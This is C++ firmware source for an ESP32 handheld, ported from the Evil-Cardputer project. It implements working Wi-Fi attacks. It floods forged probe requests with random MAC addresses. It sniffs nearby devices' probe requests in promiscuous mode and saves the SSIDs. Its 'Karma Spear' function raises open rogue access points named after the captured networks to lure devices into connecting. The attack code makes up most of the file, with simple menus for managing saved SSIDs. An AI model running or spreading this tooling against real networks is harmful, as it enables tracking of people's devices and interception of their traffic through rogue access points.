/*
 * Ported from Evil-Cardputer (Evil-M5Project) by 7h30th3r0n3.
 * Probe attack / sniff / spear + CRUD. Paths: kvx::paths::WIFI_PROBES.
 * Combined firmware: AGPL-3.0-or-later (Bruce).
 */
#if defined(EVIL_EXTENSIONS)
#include "probe.h"
#include "root/net/wifi_common.h"
#include "root/storage/paths.h"
#include "root/storage/sd_functions.h"
#include "root/ui/display.h"
#include "esp_wifi.h"
#include <WiFi.h>
#include <globals.h>
#include <set>
#include <vector>

namespace {

String probesPath() { return String(kvx::paths::WIFI_PROBES) + "/probes.txt"; }
String karmaListPath() { return String(kvx::paths::WIFI_PROBES) + "/KarmaList.txt"; }

FS *storageFs() {
    FS *fs = nullptr;
    if (!getFsStorage(fs) || fs == nullptr) return nullptr;
    kvx::paths::ensureDir(*fs, kvx::paths::WIFI_PROBES);
    return fs;
}

std::vector<String> loadLines(FS &fs, const String &path) {
    std::vector<String> lines;
    File f = fs.open(path, FILE_READ);
    if (!f) return lines;
    while (f.available()) {
        String line = f.readStringUntil('\n');
        line.trim();
        if (line.length() > 0) lines.push_back(line);
    }
    f.close();
    return lines;
}

bool writeLines(FS &fs, const String &path, const std::vector<String> &lines) {
    File f = fs.open(path, FILE_WRITE);
    if (!f) return false;
    for (const auto &l : lines) f.println(l);
    f.close();
    return true;
}

void appendUnique(FS &fs, const String &path, const String &ssid) {
    auto lines = loadLines(fs, path);
    for (const auto &l : lines) {
        if (l == ssid) return;
    }
    File f = fs.open(path, FILE_APPEND);
    if (!f) f = fs.open(path, FILE_WRITE);
    if (!f) return;
    f.println(ssid);
    f.close();
}

String randomSsid() {
    const char *alpha = "abcdefghijklmnopqrstuvwxyz0123456789";
    int n = 8 + random(8);
    String s;
    s.reserve(n);
    for (int i = 0; i < n; i++) s += alpha[random(36)];
    return s;
}

void sendProbeRequest(const char *ssid) {
    uint8_t mac[6];
    for (int i = 0; i < 6; i++) mac[i] = random(0x00, 0xFF);
    uint8_t packet[128] = {
        0x40, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], 0x00, 0x00
    };
    int pos = 24;
    int ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;
    packet[pos++] = 0x00;
    packet[pos++] = (uint8_t)ssidLen;
    memcpy(&packet[pos], ssid, ssidLen);
    pos += ssidLen;
    const uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
    memcpy(&packet[pos], rates, sizeof(rates));
    pos += sizeof(rates);
    wifiRawTx(WIFI_IF_STA, packet, pos);
}

volatile int gSniffCount = 0;

struct ProbeSlot {
    char ssid[33];
};
constexpr int kProbeQ = 32;
ProbeSlot gProbeQ[kProbeQ];
volatile int gProbeHead = 0;
volatile int gProbeTail = 0;

void probeSniffCb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    if (!pkt || pkt->rx_ctrl.sig_len < 26) return;
    const uint8_t *payload = pkt->payload;
    uint16_t fc = payload[0] | (payload[1] << 8);
    if ((fc & 0x00FC) != 0x0040) return;
    int pos = 24;
    int len = pkt->rx_ctrl.sig_len;
    while (pos + 2 <= len) {
        uint8_t id = payload[pos];
        uint8_t elen = payload[pos + 1];
        if (pos + 2 + elen > len) break;
        if (id == 0 && elen > 0 && elen <= 32) {
            int next = (gProbeHead + 1) % kProbeQ;
            if (next == gProbeTail) return;
            memcpy(gProbeQ[gProbeHead].ssid, payload + pos + 2, elen);
            gProbeQ[gProbeHead].ssid[elen] = 0;
            gProbeHead = next;
            return;
        }
        pos += 2 + elen;
    }
}

} // namespace

void probeAttack() {
    FS *fs = storageFs();
    std::vector<String> custom;
    bool useCustom = false;
    std::vector<Option> yn = {
        {"Random SSIDs", [&]() { useCustom = false; }},
        {"From probes.txt",
         [&]() {
             useCustom = true;
             if (fs) custom = loadLines(*fs, probesPath());
         }},
        {"Cancel", []() {}},
    };
    int sel = loopOptions(yn, MENU_TYPE_SUBMENU, "Probe Attack");
    if (sel < 0 || sel == 2) return;
    if (useCustom && custom.empty()) {
        displayError("No probes saved", true);
        return;
    }

    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true, true);
    delay(50);

    int probeCount = 0;
    int ssidIndex = 0;
    const uint8_t channels[] = {1, 3, 6, 9, 11};
    size_t chIdx = 0;
    drawMainBorderWithTitle("Probe Attack");
    tft.setTextColor(kvxConfig.priColor, kvxConfig.bgColor);
    tft.drawString("ESC to stop", 10, uiFooterY(FP));
    SelPress = false;
    EscPress = false;

    while (!check(EscPress) && !returnToMenu) {
        if (probeCount % 8 == 0) {
            esp_wifi_set_channel(channels[chIdx], WIFI_SECOND_CHAN_NONE);
            chIdx = (chIdx + 1) % (sizeof(channels) / sizeof(channels[0]));
        }
        String ssid = useCustom ? custom[ssidIndex++ % custom.size()] : randomSsid();
        sendProbeRequest(ssid.c_str());
        probeCount++;
        if (probeCount % 10 == 0) {
            tft.fillRect(10, uiStatusY(0), tftWidth - 20, 2 * uiRowH(FP), kvxConfig.bgColor);
            tft.drawString("Sent: " + String(probeCount), 10, uiStatusY(0));
            tft.drawString(ssid, 10, uiStatusY(1));
        }
        delay(20);
    }
    wifiDisconnect();
    displayInfo("Probes sent: " + String(probeCount), true);
}

void probeSniff() {
    FS *fs = storageFs();
    if (!fs) {
        displayError("No storage", true);
        return;
    }
    std::set<String> seen;
    gSniffCount = 0;
    gProbeHead = 0;
    gProbeTail = 0;

    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true, true);
    delay(50);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(probeSniffCb);

    uint8_t channels[] = {1, 6, 11};
    size_t chIdx = 0;
    unsigned long lastHop = millis();
    drawMainBorderWithTitle("Probe Sniff");
    tft.drawString("ESC to stop", 10, uiFooterY(FP));
    EscPress = false;

    while (!check(EscPress) && !returnToMenu) {
        while (gProbeTail != gProbeHead) {
            String s(gProbeQ[gProbeTail].ssid);
            gProbeTail = (gProbeTail + 1) % kProbeQ;
            if (s.length() && seen.find(s) == seen.end()) {
                seen.insert(s);
                appendUnique(*fs, probesPath(), s);
                gSniffCount = (int)seen.size();
            }
        }
        if (millis() - lastHop > 333) {
            esp_wifi_set_channel(channels[chIdx], WIFI_SECOND_CHAN_NONE);
            chIdx = (chIdx + 1) % 3;
            lastHop = millis();
        }
        tft.fillRect(10, uiStatusY(0), tftWidth - 20, uiRowH(FP), kvxConfig.bgColor);
        tft.drawString("Unique SSIDs: " + String((int)gSniffCount), 10, uiStatusY(0));
        delay(80);
    }

    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_promiscuous(false);
    wifiDisconnect();
    displayInfo("Saved " + String((int)gSniffCount) + " probes", true);
}

void karmaSpear() {
    FS *fs = storageFs();
    if (!fs) {
        displayError("No storage", true);
        return;
    }
    auto list = loadLines(*fs, karmaListPath());
    if (list.empty()) list = loadLines(*fs, probesPath());
    if (list.empty()) {
        displayError("No KarmaList/probes", true);
        return;
    }

    drawMainBorderWithTitle("Karma Spear");
    EscPress = false;
    for (size_t i = 0; i < list.size(); i++) {
        if (check(EscPress)) break;
        tft.fillRect(10, uiStatusY(0), tftWidth - 20, 2 * uiRowH(FP), kvxConfig.bgColor);
        tft.drawString(String(i + 1) + "/" + String(list.size()), 10, uiStatusY(0));
        tft.drawString(list[i], 10, uiStatusY(1));
        WiFi.mode(WIFI_AP);
        WiFi.softAP(list[i].c_str(), nullptr, 6, 0, 4);
        unsigned long until = millis() + 4000;
        while (millis() < until && !check(EscPress)) delay(50);
        WiFi.softAPdisconnect(true);
    }
    wifiDisconnect();
    displayInfo("Spear finished", true);
}

void selectProbe() {
    FS *fs = storageFs();
    if (!fs) {
        displayError("No storage", true);
        return;
    }
    auto lines = loadLines(*fs, probesPath());
    if (lines.empty()) {
        displayError("No probes saved", true);
        return;
    }
    std::vector<Option> opts;
    for (const auto &l : lines) {
        String ssid = l;
        opts.push_back({ssid.c_str(), [ssid]() { displayInfo("Selected:\n" + ssid, true); }});
    }
    opts.push_back({"Back", []() {}});
    loopOptions(opts, MENU_TYPE_SUBMENU, "Select Probe");
}

void deleteProbe() {
    FS *fs = storageFs();
    if (!fs) {
        displayError("No storage", true);
        return;
    }
    auto lines = loadLines(*fs, probesPath());
    if (lines.empty()) {
        displayError("No probes saved", true);
        return;
    }
    std::vector<Option> opts;
    for (size_t i = 0; i < lines.size(); i++) {
        String ssid = lines[i];
        opts.push_back({ssid.c_str(), [fs, ssid]() {
                            auto all = loadLines(*fs, probesPath());
                            std::vector<String> keep;
                            for (const auto &l : all) {
                                if (l != ssid) keep.push_back(l);
                            }
                            writeLines(*fs, probesPath(), keep);
                            displayInfo("Deleted " + ssid, true);
                        }});
    }
    opts.push_back({"Back", []() {}});
    loopOptions(opts, MENU_TYPE_SUBMENU, "Delete Probe");
}

void deleteAllProbes() {
    FS *fs = storageFs();
    if (!fs) {
        displayError("No storage", true);
        return;
    }
    std::vector<Option> yn = {
        {"Confirm wipe",
         [fs]() {
             writeLines(*fs, probesPath(), {});
             displayInfo("All probes deleted", true);
         }},
        {"Cancel", []() {}},
    };
    loopOptions(yn, MENU_TYPE_SUBMENU, "Delete All Probes");
}

#endif
